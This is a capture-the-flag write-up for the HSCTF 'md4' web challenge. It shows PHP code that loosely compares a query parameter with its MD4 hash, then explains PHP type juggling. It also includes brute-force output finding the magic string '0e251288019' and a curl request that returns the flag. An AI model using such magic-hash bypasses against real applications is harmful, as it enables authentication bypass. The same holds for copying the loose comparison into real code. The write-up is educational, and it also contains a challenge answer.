We are given following challenge url - https://md4.web.chal.hsctf.com/index.php . Visiting it, we get displayed source code logic.
```
<?php
$flag = file_get_contents("/flag");

if (!isset($_GET["md4"]))
{
    highlight_file(__FILE__);
    die();
}

if ($_GET["md4"] == hash("md4", $_GET["md4"]))
{
    echo $flag;
}
else
{
    echo "bad";
}
?>
```
Notice the `$_GET["md4"] == hash("md4", $_GET["md4"])`. It's well known that `==` equality operator in PHP is vulnerable to type-juggling injection as it only compares values of variables, and not their data types.
```
$ php -a
<?php
if("0" == "0e12") {
    echo "lul";
}
?>

lul
```
> When comparing a string to a number, PHP will attempt to convert the string to a number then perform a numeric comparison.
> It gets weirder... If PHP decides that both operands look like numbers, even if they are actually strings, it will convert them both and perform a numeric comparison.

We know that our challenge needs a `md4` parameter in url query, and then it loosely-comapres that value with it's md4 hash. So what we need to do this find a string with prefix "0e" that results in a md4 hash wtih "0e" as well, so we can bypass with type-juggling.

I wrote this [script](./data/crack_md4.py) to do a bruteforce search for the solution. Running the script for a couple of minutes gave us the desired string.
```
$ python crack_md4.py
[+] current value: 0e9999999       10000000 iterations, continue...
[+] current value: 0e19999999       20000000 iterations, continue...
[+] current value: 0e29999999       30000000 iterations, continue...
[+] current value: 0e39999999       40000000 iterations, continue...
[+] current value: 0e49999999       50000000 iterations, continue...
[+] current value: 0e59999999       60000000 iterations, continue...
[+] current value: 0e69999999       70000000 iterations, continue...
[+] current value: 0e79999999       80000000 iterations, continue...
[+] current value: 0e89999999       90000000 iterations, continue...
[+] current value: 0e99999999       100000000 iterations, continue...
[+] current value: 0e109999999       110000000 iterations, continue...
[+] current value: 0e119999999       120000000 iterations, continue...
[+] current value: 0e129999999       130000000 iterations, continue...
[+] current value: 0e139999999       140000000 iterations, continue...
[+] current value: 0e149999999       150000000 iterations, continue...
[+] current value: 0e159999999       160000000 iterations, continue...
[+] current value: 0e169999999       170000000 iterations, continue...
[+] current value: 0e179999999       180000000 iterations, continue...
[+] current value: 0e189999999       190000000 iterations, continue...
[+] current value: 0e199999999       200000000 iterations, continue...
[+] current value: 0e209999999       210000000 iterations, continue...
[+] current value: 0e219999999       220000000 iterations, continue...
[+] current value: 0e229999999       230000000 iterations, continue...
[+] current value: 0e239999999       240000000 iterations, continue...
[+] current value: 0e249999999       250000000 iterations, continue...
[+] found! md4( 0e251288019 ) ---> 0e874956163641961271069404332409
[+] in 251288020 iterations

$ curl https://md4.web.chal.hsctf.com/index.php?md4=0e251288019
hsctf{php_type_juggling_is_fun}
```
